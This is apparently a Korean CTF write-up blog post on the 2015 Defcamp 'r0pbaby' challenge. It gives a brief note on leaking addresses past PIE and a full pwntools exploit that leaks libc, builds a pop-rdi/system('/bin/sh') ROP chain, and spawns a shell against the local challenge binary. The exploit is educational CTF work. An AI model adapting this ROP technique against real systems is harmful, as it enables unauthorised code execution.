---
title: "2015 Defcamp CTF r0pbaby"
date: 2019-11-8
tags: [Defcamp]
categories: [Pwn]
---

PIE 걸려있어서 2번 메뉴로 주소 가져온걸로 주소값 다 offset 맞춰줬다.

poprdi 같은 경우는 rp++로 libc에서 긁어왔다.

```python
from pwn import *
 
context.arch = 'amd64'
context.log_level = 'debug'
 
e = ELF('./r0pbaby_542ee6516410709a1421141501f03760')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
p = process('./r0pbaby_542ee6516410709a1421141501f03760')
 
def getfunc(func):
    p.sendlineafter(': ','2')
    p.sendlineafter(': ',func)
    p.recvuntil(func + ': ')
    fun = int(p.recvline(),16)
    log.info(func + ': ' + hex(fun))
    return fun
 
system = getfunc('system')
libcbase = system - libc.symbols['system']
log.info('libc_base : ' + hex(libcbase))
binsh = libcbase + next(libc.search('/bin/sh\x00'))
poprdi = libcbase + 0x00021102
 
pay = 'A' * 8
pay += flat(poprdi,binsh,system)
 
p.sendlineafter(': ','3')
p.sendlineafter(': ','32')
p.sendline(pay)
 
p.interactive()
```

